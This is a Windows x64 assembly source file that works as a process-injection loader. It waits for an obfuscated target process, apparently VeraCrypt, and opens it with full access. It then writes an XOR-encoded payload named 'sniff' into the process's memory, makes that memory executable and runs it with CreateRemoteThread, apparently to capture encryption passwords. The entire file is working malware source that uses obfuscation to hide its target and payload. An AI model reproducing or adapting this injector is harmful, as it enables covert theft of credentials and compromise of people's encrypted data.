section .text
global WinMain

%include '..\utils_64_text.asm'

WinMain:
    push rbp
    mov rbp, rsp

    ; [rbp - 8] = return value
    ; [rbp - 16] = kernel mod handle
    ; [rbp - 24] = proc id
    ; [rbp - 32] = proc handle
    ; [rbp - 40] = *payload mem
    ; [rbp - 48] = dw old protect
    ; [rbp - 56] = hThread
    ; 8 bytes padding
    sub rsp, 48                     ; allocate local variable space

    mov qword [rbp - 8], 0          ; return value

    sub rsp, 32
    call get_kernel_module_handle
    add rsp, 32

    mov [rbp - 16], rax             ; kernel mod handle

    sub rsp, 32
    mov rcx, [rbp - 16]             ; kernel mod handle
    call populate_kernel_function_ptrs_by_name
    add rsp, 32

    sub rsp, 32
    mov rcx, veracrypt_xor
    mov rdx, veracrypt_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor
    add rsp, 32

.loop:
    sub rsp, 32
    mov rcx, veracrypt_xor
    mov rdx, veracrypt_xor.len
    call find_target_process_id     ; proc id
    add rsp, 32

    cmp rax, 0
    jne .loop_end
    
    sub rsp, 32
    mov rcx, 5000
    call [sleep]
    add rsp, 32

    jmp .loop

.loop_end:
int3
    mov [rbp - 24], rax             ; proc id

    sub rsp, 32
    mov rcx, PROCESS_ALL_ACCESS
    mov rdx, 0
    mov r8, [rbp - 24]
    call [open_process]        ; proc handle
    add rsp, 32

    cmp rax, 0
    je .shutdown

    mov [rbp - 32], rax             ; proc handle

    sub rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align
    mov rcx, [rbp - 32]
    mov rdx, 0
    mov r8, sniff_data_xor.len
    mov r9, MEM_RESERVE
    xor r9, MEM_COMMIT
    mov qword [rsp + 32], PAGE_READWRITE
    call [virtual_alloc_ex]    ; mem addr
    add rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align

    cmp rax, 0                      ; if addr == 0 ?
    je .shutdown

    mov [rbp - 40], rax             ; payload mem

    sub rsp, 32
    mov rcx, sniff_data_xor
    mov rdx, sniff_data_xor.len
    mov r8, xor_key
    mov r9, xor_key.len
    call my_xor
    add rsp, 32

    sub rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align
    mov rcx, [rbp - 32]
    mov rdx, [rbp - 40]
    mov r8, sniff_data_xor
    mov r9, sniff_data_xor.len
    mov qword [rsp + 32], 0
    call [write_process_memory]
    add rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align

    cmp rax, 0                      ; write process memory failed ?
    je .shutdown

    sub rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align
    mov rcx,  [rbp - 32]
    mov rdx, [rbp - 40]
    mov r8, sniff_data_xor.len
    mov r9, PAGE_EXECUTE_READ
    mov [rsp + 32], rbp
    sub qword [rsp + 32], 48
    call [virtual_protect_ex]
    add rsp, 48                     ; shadow space + 8 byte 5th arg + 8 byte stack align

    cmp rax, 0                      ; virtual protect ex failed ?
    je .shutdown

    sub rsp, 64                     ; shadow space + 12 bytes vars + 8 byte padding
    mov rcx, [rbp - 32]
    xor rdx, rdx
    xor r8, r8
    mov r9, [rbp - 40]
    mov qword [rsp + 32], 0
    mov qword [rsp + 40], 0
    mov qword [rsp + 48], 0
    call [create_remote_thread]    ; thread handle
    add rsp, 64                     ; shadow space + 12 bytes vars + 8 byte padding

    cmp rax, 0                      ; hThread == NULL ?
    je .shutdown
        mov [rbp - 56], rax         ; hThread

        sub rsp, 32
        mov rcx, rax
        mov rdx, -1
        call [wait_for_single_object]
        add rsp, 32

        sub rsp, 32
        mov rcx, [rbp - 56]         ; hThread
        call [close_handle]
        add rsp, 32

.shutdown:

    sub rsp, 32
    mov rcx, [rbp - 32]
    mov rdx, [rbp - 40]
    xor r8, r8
    mov r9, MEM_RELEASE
    call [virtual_free_ex]
    add rsp, 32

    sub rsp, 32
    mov rcx, [rbp - 32]
    call [close_handle]
    add rsp, 32

    add rsp, 48                     ; free local variable space

    mov rax, [rbp - 8]              ; return value

    leave
    ret

section .data
veracrypt_xor: db 0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55, 0x0
.len equ $ - veracrypt_xor - 1

; %include '..\tests\calc-thread64.inc.asm'
%include '..\sniff\sniff.bin.asm'
%include '..\utils_64_data.asm'